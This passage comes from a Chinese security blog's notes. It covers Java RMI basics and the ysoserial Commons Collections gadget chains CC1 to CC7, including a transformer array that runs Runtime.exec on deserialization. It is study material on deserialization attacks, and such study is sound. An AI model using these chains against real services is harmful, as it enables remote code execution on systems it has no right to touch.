<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220403001436-i6ptn11.png" alt="image.png"></p>
<p>完整方法栈，可以看到我们的TemplatesImpl对象</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220403001723-s3h5ol8.png" alt="image.png"></p>
]]></content>
      <categories>
        <category>javaSec</category>
      </categories>
      <tags>
        <tag>java反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>RMI原理及流程</title>
    <url>/2022/03/05/RMI%E5%8E%9F%E7%90%86%E5%8F%8A%E6%B5%81%E7%A8%8B/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>学习过程中发现有很多“概念性”的东西，导致大段的文字说明出现。</p>
<p>java这门语言，我自认为很多“概念性”的东西其实源自于它的语言特性像继承多态这种，所以其实可以不用说的这么繁琐。</p>
<p>以后我记笔记的时候应该要尝试怎么用最简单的语言去描述，并且阅读源码才是最重要的。</p>
<p>学习过程中愈加感觉到，<strong>耐心，细心</strong>这两点尤其重要！</p>
<h1 id="初识JAVA-RMI"><a href="#初识JAVA-RMI" class="headerlink" title="初识JAVA RMI"></a>初识JAVA RMI</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>RMI（Remote Method Invocation）为远程方法调用，是允许运行在一个Java虚拟机的对象调用运行在另一个Java虚拟机上的对象的方法。 这两个虚拟机可以是运行在相同计算机上的不同进程中，也可以是运行在网络上的不同计算机中。</p>
<p>Java RMI：Java远程方法调用，即Java RMI（Java Remote Method Invocation）是Java编程语言里，一种用于实现远程过程调用的应用程序编程接口。它使客户机上运行的程序可以调用远程服务器上的对象。远程方法调用特性使Java编程人员能够在网络环境中分布操作。RMI全部的宗旨就是尽可能简化远程接口对象的使用。</p>
<p><a href="https://blog.csdn.net/xinghun_4/article/details/45787549">https://blog.csdn.net/xinghun_4&#x2F;article&#x2F;details&#x2F;45787549</a><br /></p>
<h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><p>整个RMI的流程分为三个部分，RMIServer , RMIClient , RMIRegister，其中RMIRegister（RMIService)担任中间人的身份</p>
<p>服务端( RMIServer ) 会将自己提供的服务的实现类交给这个中间人 , 并公开一个名称 . 任何客户端( RMIClient )都可以通过公开的名称找到这个实现类 , 并调用它</p>
<p>这样做避免了服务端和客户端资源的直接交互，也使得客户端能更好地查找要使用的对象。解决了一部分安全问题。</p>
<p>关于Stub存根：</p>
<p>在 JVM 之间通过 RMI 进行远程对象的调用时，并不是简单地直接将远程对象复制一份传递给客户端，而是传递了一个远程对象 Stub ，Stub 基本上相当于是远程对象的引用或者 <strong>代理</strong> （java 在 RMI 中用到了代理模式）。Stub 对象对于我们是透明的，客户端可以像调用本地方法一样直通过 Stub 对象来调用远程的方法。</p>
<p><img src="https://o.130014.xyz/2022/03/05/image-20220304173116-y7586sp.png" alt="image-20220304173116-y7586sp.png"></p>
<p>交互时序图：</p>
<p><a href="https://www.wailian.work/image/QUajkS"><img src="https://o.130014.xyz/2022/03/05/image-20220304205514-millkuw.png" alt="image-20220304205514-millkuw.png"></a></p>
<h2 id="实现一个简单的rmi应用"><a href="#实现一个简单的rmi应用" class="headerlink" title="实现一个简单的rmi应用"></a>实现一个简单的rmi应用</h2><h3 id="定义一个远程接口"><a href="#定义一个远程接口" class="headerlink" title="定义一个远程接口"></a>定义一个远程接口</h3><p>准备一个接口，让客户端通过这个接口来访问服务</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Hello</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    String <span class="title function_">sayHello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li><p>在 Java 中 , 如果一个类继承了 java.rmi.Remote 接口 , 那么该类将成为一个服务端的远程对象 , 供客户端访问并提供一定的服务</p>
</li>
<li><blockquote>
<p>JavaDoc描述：Remote 接口用于标识其方法可以从非本地虚拟机上调用的接口。任何远程对象都必须直接或间接实现此接口。只有在“远程接口”（扩展java.rmi.Remote 的接口）中指定的这些方法才可被远程调用。</p>
</blockquote>
</li>
<li><p>extends了Remote接口的类或者其他接口中的方法若是声明抛出了RemoteException异常，则表明该方法可被客户端远程访问调用。</p>
</li>
</ul>
<h3 id="远程接口实现类"><a href="#远程接口实现类" class="headerlink" title="远程接口实现类"></a>远程接口实现类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">Hello</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">HelloImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Connect from &quot;</span>+name);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hello there&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>远程对象必须实现java.rmi.server.UniCastRemoteObject类，这样才能保证客户端访问获得远程对象时，该远程对象将会把自身的一个拷贝以Socket的形式传输给客户端，此时客户端所获得的这个拷贝称为“存根Stub”，而服务器端本身已存在的远程对象则称之为“骨架Skeleton”。</p>
<p>其实此时的存根是客户端的一个代理，用于与服务器端的通信，而骨架也可认为是服务器端的一个代理，用于接收客户端的请求之后调用远程方法来响应客户端的请求。</p>
<p>其实 , 与其说是客户端和服务端进行交互 , 不如说是 客户端代理( Stub ) 和 服务端代理( Skeleton ) 在进行交互 。</p>
<p>在 JDK1.2 以后的 RMI 中 , 可以通过反射API 直接将请求发送给真实类 , 不再需要 Skeleton 来做中转了</p>
<h3 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RmiServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//生成服务</span></span><br><span class="line">            <span class="type">Hello</span> <span class="variable">hello</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HelloImpl</span>();<span class="comment">//生成stub和skeleton,并返回stub代理引用</span></span><br><span class="line">            <span class="comment">//注册端口</span></span><br><span class="line">            LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">            java.rmi.Naming.rebind(<span class="string">&quot;rmi://127.0.0.1:1099/hello&quot;</span>,hello);<span class="comment">//将stub代理绑定到Registry服务的URL上，客户端可以通过这个URL直接访问远程对象</span></span><br><span class="line">            System.out.println(<span class="string">&quot;Ready&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (MalformedURLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>RMIService ( RMIRegister ) 服务的默认端口为 : 1099</p>
<h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RmiClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Hello</span> <span class="variable">hello</span> <span class="operator">=</span> (Hello) Naming.lookup(<span class="string">&quot;rmi://localhost:1099/hello&quot;</span>);</span><br><span class="line">            System.out.println(hello.sayHello(<span class="string">&quot;xianbei&quot;</span>));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NotBoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (MalformedURLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://o.130014.xyz/2022/03/05/image-20220305010523-3hnef8v.png" alt="image-20220305010523-3hnef8v.png"></p>
<h3 id="类继承图"><a href="#类继承图" class="headerlink" title="类继承图"></a>类继承图</h3><p><img src="https://o.130014.xyz/2022/03/05/image-20220304205543-skkud0p.png" alt="image-20220304205543-skkud0p.png"></p>
<p>在我中间编写demo的时候出现了一些小问题，<code>Hello hello = (Hello) Naming.lookup(&quot;rmi://localhost:1099/hello&quot;);</code></p>
<p>这里是一个关于接口的知识点，太久所以有所遗忘。接口类型用来声明一个接口类型的引用变量</p>
<p><a href="https://www.cnblogs.com/xiaoheliu1024/p/10918017.html">https://www.cnblogs.com/xiaoheliu1024/p/10918017.html</a></p>
<h2 id="通讯流程分析"><a href="#通讯流程分析" class="headerlink" title="通讯流程分析"></a>通讯流程分析</h2><p>tcp.stream eq 41</p>
<p>tcp.stream eq 49</p>
<p>一共建立了两次tcp连接，客户端先连接Registry，寻找Hello对象，Registry返回一个序列化数据，就是Hello对象，客户端反序列化这个数据，发现是远程对象，然后根据封装的ip端口建立新的tcp连接，并且进行远程方法调用</p>
<p>服务端给返回给客户端的Hello类，其中为反序列化数据，以及其他的rmi中的类</p>
<p><img src="https://o.130014.xyz/2022/03/05/image-20220305151629-x10h630.png" alt="image-20220305151629-x10h630.png"></p>
<p><img src="https://o.130014.xyz/2022/03/05/image-20220305152802-dzp3lm9.png" alt="image-20220305152802-dzp3lm9.png"></p>
<p>也就是rmi register只会返回一个注册了的远程对象，然后服务端执行远程命令调用它而已</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.guildhab.top/2020/03/java-rmi-ldap-%e6%b5%81%e7%a8%8b%e5%88%86%e6%9e%90/">https://www.guildhab.top/2020/03/java-rmi-ldap-%e6%b5%81%e7%a8%8b%e5%88%86%e6%9e%90/</a></p>
]]></content>
      <categories>
        <category>javaSec</category>
      </categories>
      <tags>
        <tag>rmi</tag>
      </tags>
  </entry>
  <entry>
    <title>Ysoserial ACC总结</title>
    <url>/2022/04/04/cc%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>调试完了Ysoserial中Apache-Commons-Collections的七条链子，对其进行简单总结。</p>
<p>分为三大模块</p>
<ul>
<li>Gaget Chains——直观的把每个链子的调用情况列出来</li>
<li>基础类——其中常见的类与方法，是实现关键调用的子弹</li>
<li>反序列化时重写了readObject方法的类——一般为链子的开头部分，有了它才能完成反序列化调用</li>
</ul>
<h1 id="蓝图——Gaget-Chains"><a href="#蓝图——Gaget-Chains" class="headerlink" title="蓝图——Gaget Chains"></a>蓝图——Gaget Chains</h1><p>简要回顾一下这七条Gaget Chain</p>
<blockquote>
<p>下文中提到的“攻击链”为一部分固定的连续调用方法，我自个儿起的名字。因为是固定且多次出现所以这样方便称呼。</p>
</blockquote>
<h2 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">	AnnotationInvocationHandler.readObject()</span><br><span class="line">		Map(Proxy).entrySet()</span><br><span class="line">			AnnotationInvocationHandler.invoke()</span><br><span class="line">				LazyMap.get()</span><br><span class="line">					ChainedTransformer.transform()</span><br><span class="line">						ConstantTransformer.transform()</span><br><span class="line">						InvokerTransformer.transform()</span><br><span class="line">							Method.invoke()</span><br><span class="line">								Class.getMethod()</span><br><span class="line">						InvokerTransformer.transform()</span><br><span class="line">							Method.invoke()</span><br><span class="line">								Runtime.getRuntime()</span><br><span class="line">						InvokerTransformer.transform()</span><br><span class="line">							Method.invoke()</span><br><span class="line">								Runtime.exec()</span><br></pre></td></tr></table></figure>

<p>入口为<code>AnnotationInvocationHandler.readObject()</code></p>
<p>通过<code>LazyMap</code>攻击链</p>
<p>最后通过<code>TransformerMap</code>攻击链完成反射方法调用</p>
<h2 id="CC2"><a href="#CC2" class="headerlink" title="CC2"></a>CC2</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">	PriorityQueue.readObject()</span><br><span class="line">			TransformingComparator.compare()</span><br><span class="line">				InvokerTransformer.transform()</span><br><span class="line">					Method.invoke()</span><br><span class="line">						Runtime.exec()</span><br></pre></td></tr></table></figure>

<p>入口为<code>PriorityQueue</code>，也就是优先队列的readObject方法</p>
<p>在排序的时候可以控制comparator</p>
<p>最后实际上是触发，TemplatesImpl攻击链</p>
<p>也就是通过加载字节码来执行恶意代码</p>
<h2 id="CC3"><a href="#CC3" class="headerlink" title="CC3"></a>CC3</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">		AnnotationInvocationHandler.readObject()</span><br><span class="line">			Map(Proxy).entrySet()</span><br><span class="line">				AnnotationInvocationHandler.invoke()</span><br><span class="line">					LazyMap.get()</span><br><span class="line">						ChainedTransformer.transform()</span><br><span class="line">							InstantiateTransformer.transform()</span><br><span class="line">								TemplatesImpl.newTransformer()</span><br><span class="line">									加载静态块恶意代码</span><br></pre></td></tr></table></figure>

<p>入口为<code>AnnotationInvocationHandler.readObject()</code></p>
<p>其中通过<code>LazyMap</code>攻击链</p>
<p>最后加载了<code>TemplatesImpl</code>攻击链</p>
<p>加载字节码执行恶意代码</p>
<h2 id="CC4"><a href="#CC4" class="headerlink" title="CC4"></a>CC4</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">	PriorityQueue.readObject()</span><br><span class="line">		TransformingComparator.compare()</span><br><span class="line">			ConstantTransformer.transform()</span><br><span class="line">				InstantiateTransformer.transform()</span><br><span class="line">					TemplatesImpl.newTransformer()</span><br><span class="line">						加载静态块恶意代码</span><br></pre></td></tr></table></figure>

<p>入口为<code>PriorityQueue.readObject()</code></p>
<p>与CC2不同的是，他触发的是<code>InstantiateTransformer.transform()</code>，也就和CC3一样</p>
<h2 id="CC5"><a href="#CC5" class="headerlink" title="CC5"></a>CC5</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">      BadAttributeValueExpException.readObject()</span><br><span class="line">          TiedMapEntry.toString()</span><br><span class="line">              LazyMap.get()</span><br><span class="line">                  ChainedTransformer.transform()</span><br><span class="line">                      ConstantTransformer.transform()</span><br><span class="line">                      InvokerTransformer.transform()</span><br><span class="line">                          Method.invoke()</span><br><span class="line">                              Class.getMethod()</span><br><span class="line">                      InvokerTransformer.transform()</span><br><span class="line">                          Method.invoke()</span><br><span class="line">                              Runtime.getRuntime()</span><br><span class="line">                      InvokerTransformer.transform()</span><br><span class="line">                         Method.invoke()</span><br><span class="line">                              Runtime.exec()</span><br></pre></td></tr></table></figure>

<p>入口为<code>BadAttributeValueExpException.readObject()</code></p>
<p>通过<code>TiedMapEntry.toString()</code>方法</p>
<p>触发<code>LazyMap</code>攻击链</p>
<h2 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java.io.ObjectInputStream.readObject()</span><br><span class="line">	java.util.HashMap.readObject()</span><br><span class="line">		java.util.HashMap.hash()</span><br><span class="line">		org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span><br><span class="line">			org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span><br><span class="line">				org.apache.commons.collections.map.LazyMap.get()</span><br><span class="line">					org.apache.commons.collections.functors.ChainedTransformer.transform()</span><br><span class="line">						org.apache.commons.collections.functors.InvokerTransformer.transform()</span><br><span class="line">							 java.lang.reflect.Method.invoke()</span><br><span class="line">							 java.lang.Runtime.exec()</span><br></pre></td></tr></table></figure>

<p>适用JDK8u71及之后</p>
<p>入口为<code>HashMap.readObject()</code></p>
<p>来触发<code>TiedMapEntry.hashCode()</code></p>
<p>最后触发<code>LazyMap</code>攻击链</p>
<h2 id="CC7"><a href="#CC7" class="headerlink" title="CC7"></a>CC7</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java.util.Hashtable.readObject</span><br><span class="line">    java.util.Hashtable.reconstitutionPut</span><br><span class="line">   	 org.apache.commons.collections.map.AbstractMapDecorator.equals</span><br><span class="line">   		 java.util.AbstractMap.equals</span><br><span class="line">    			org.apache.commons.collections.map.LazyMap.get</span><br><span class="line">    				org.apache.commons.collections.functors.ChainedTransformer.transform</span><br><span class="line">    					org.apache.commons.collections.functors.InvokerTransformer.transform</span><br></pre></td></tr></table></figure>

<p>入口为<code>Hashtable.readObject</code>，其中触发哈希碰撞</p>
<p>从而触发<code>AbstractMapDecorator.equals</code>方法</p>
<p>最终调用<code>LazyMap</code>攻击链</p>
<h1 id="子弹——常见类与方法"><a href="#子弹——常见类与方法" class="headerlink" title="子弹——常见类与方法"></a>子弹——常见类与方法</h1><h2 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h2><p>org.apache.commons.collections.functors.ConstantTransformer</p>
<p>ysoserial中最常见的构造方式：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123; <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>) &#125;);</span><br></pre></td></tr></table></figure>

<p>这个类的主要就是transform方法，返回<code>iConstant</code>属性，一般为transformer数组中第一个元素，为<code>ChainedTransformer</code>的transform方法第一个调用的类。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.iConstant = constantToReturn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="InvokeTransformer"><a href="#InvokeTransformer" class="headerlink" title="InvokeTransformer"></a>InvokeTransformer</h2><p>org.apache.commons.collections.functors.InvokeTransformer</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.iMethodName = methodName;</span><br><span class="line">        <span class="built_in">this</span>.iParamTypes = paramTypes;</span><br><span class="line">        <span class="built_in">this</span>.iArgs = args;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">                <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="built_in">this</span>.iMethodName, <span class="built_in">this</span>.iParamTypes);</span><br><span class="line">                <span class="keyword">return</span> method.invoke(input, <span class="built_in">this</span>.iArgs);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchMethodException var5) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IllegalAccessException var6) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InvocationTargetException var7) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, var7);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>transformer数组中反射调用方法的关键类，transform方法实现了反射调用。</p>
<p>构造函数要求传入方法名，方法需要参数类型，具体参数</p>
<p>transform方法反射执行一个类的一个特定方法</p>
<h2 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h2><p>org.apache.commons.collections.functors.ChainedTransformer</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.iTransformers = transformers;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="built_in">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">        object = <span class="built_in">this</span>.iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>构造方法可以传入一个transformers数组</p>
<p>transform方法实现了数组中的递归调用，前一个元素transform方法的返回值为后一个元素transform方法的参数</p>
<p>因此一般我们这样构造transformer数组：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> String[] execArgs = <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;;</span><br><span class="line"><span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">		<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">		<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">			String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">			<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">		<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">			Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">			<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">		<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">			<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;, execArgs),</span><br><span class="line">		<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>) &#125;;</span><br></pre></td></tr></table></figure>

<p>等价于</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Runtime.class.getMethod(<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>).invoke(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]).exec(<span class="string">&quot;calc.exe&quot;</span>)</span><br></pre></td></tr></table></figure>


<p>以上三个transformer通过组合可以完整调用命令执行，入口为<code>ChainedTransformer.transform()</code></p>
<h2 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h2><p>org.apache.commons.collections.map.LazyMap</p>
<p>ysoserial中常见的构造方式：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="keyword">final</span> <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LazyMap</span> <span class="keyword">extends</span> <span class="title class_">AbstractMapDecorator</span> <span class="keyword">implements</span> <span class="title class_">Map</span>, Serializable</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LazyMap</span>(map, factory);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="title function_">LazyMap</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(map);</span><br><span class="line">    <span class="keyword">if</span> (factory == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Factory must not be null&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.factory = factory;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">super</span>.map.containsKey(key)) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.factory.transform(key);</span><br><span class="line">        <span class="built_in">super</span>.map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过decorate方法返回LazyMap实例。</p>
<p>LazyMap.get()方法调用了<code>this.factory.transform(key)</code></p>
<p>当我们把this.factory指向<code>ChainedTransformer</code>的时候，就能完成攻击链调用。</p>
<h2 id="TiedMapEntry"><a href="#TiedMapEntry" class="headerlink" title="TiedMapEntry"></a>TiedMapEntry</h2><p>org.apache.commons.collections.keyvalue.TiedMapEntry</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TiedMapEntry</span> <span class="keyword">implements</span> <span class="title class_">Entry</span>, KeyValue, Serializable </span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="title function_">TiedMapEntry</span><span class="params">(Map map, Object key)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.map = map;</span><br><span class="line">        <span class="built_in">this</span>.key = key;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.map.get(<span class="built_in">this</span>.key);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//调用了this.getValue()-&gt;this.map.get</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object obj)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (obj == <span class="built_in">this</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!(obj <span class="keyword">instanceof</span> Entry)) &#123;</span><br><span 